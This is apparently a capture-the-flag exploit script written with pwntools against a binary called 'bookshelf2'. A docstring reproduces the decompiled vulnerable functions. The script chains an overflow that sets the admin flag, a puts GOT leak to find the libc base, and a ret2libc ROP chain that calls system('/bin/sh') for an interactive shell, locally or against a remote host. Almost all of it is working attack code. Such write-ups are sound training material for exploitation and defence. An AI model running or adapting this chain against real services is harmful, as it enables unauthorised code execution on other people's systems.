#!/usr/bin/env python3


"""
Ghidra decompile

void adminBook(int param_1)

{
  char local_38 [48];
  
  if (param_1 == 0) {
    puts("\nUnauthorized access: admins only!\n");
  }
  else {
    puts(
        "\nYou\'re an admin so I trust that you will be responsible with writing this very special b ook..."
        );
    printf(" >> ");
    fgets(local_38,0x100,stdin);
    puts("Book saved!");
  }
  return;
}

void writeBook(char *book)
{
  int iVar1;
  char buffer [47];
  char user_choice;
  
  memset(book,0,0x28);
  puts("Always great to see aspiring authors!");
  printf("Is this book an audiobook? (y/N) >> ");
  iVar1 = getchar();
  user_choice = (char)iVar1;
  if (user_choice != '\n') {
    getchar();
  }
  if ((user_choice == 'y') || (user_choice == 'Y')) {
    *(undefined4 *)book = 0x29424128;
    *(undefined4 *)(book + 3) = 0x203a29;
  }
  printf("Please write your book (40 chars max) >> ");
  fgets(buffer,0x28,stdin);
  if ((user_choice == 'y') || (user_choice == 'Y')) {
    strcat(book,buffer);
  }
  else {
    strcpy(book,buffer);
  }
  puts("Book saved!");
  return;
}

main just calls the various functions based on user input.

Multiple vulnerabilities are needed to chain together to a ROP. We 
have to write a book and choose audiobook which adds 3 bytes of random data 
to our book buffer which lets us overflow into the admin check if we provide
38 bytes of data which lets us become admin and then the admin letâ€™s you do 
a buffer overflow which we can just do a ret2libc to get a shell
"""

from pwn import *


exe = ELF("./bookshelf2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       c
        ''')

    return r


def main():
    r = conn()

    log.progress("Exploiting")

    # Step one: Get admin access
    payload = b'1\ny\n' + b'A'*38 + b'\n'
    r.send(payload)
    r.recvuntil (b'out')
    r.recvuntil (b'>>')

    # Step two: leak libc address
    payload = b'3\n'
    payload += b'A'*48

    rop = ROP(exe)
    puts_plt = exe.plt['puts']
    main = exe.symbols['main']
    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
    ret = (rop.find_gadget(['ret']))[0]
    puts_got = exe.got['puts']

    payload += p64(ret) + \
               p64(pop_rdi) + \
               p64(puts_got) + \
               p64(puts_plt) + \
               p64(main) + \
               b'\n'

    r.clean()
    r.send(payload)
    r.recvuntil(b'Book saved!\n')

    leak = u64(r.recvline().strip().ljust(8, b"\x00"))
    log.progress("Puts libc address: ", hex(leak))
    libc.address = leak - libc.sym['puts']
    log.progress("Libc address: ", hex(libc.address))
    r.clean()

    # Step three: Get admin access again
    payload = b'1\ny\n' + b'A'*38 + b'\n'
    r.send(payload)
    r.clean()

    # Step four: ret2libc
    payload = b'3\n'
    payload += b'A'*48

    log.progress("Finding gadgets")
    pop_rdi = rop.rdi.address
    system = libc.sym['system']
    log.progress("Libc system: ", hex(system))
    binsh = next(libc.search(b'/bin/sh'))
    log.progress("Libc binsh: ", hex(binsh))
    ret = rop.ret.address

    log.progress("Building ROP Chain")
    payload += p64(ret) + \
               p64(pop_rdi) + \
               p64(binsh) + \
               p64(ret) + \
               p64(system) + \
               b'\n'

    r.send(payload)

    r.recvuntil(b'Book saved!')


    # Should have a shell now
    r.interactive()

if __name__ == "__main__":
    main()
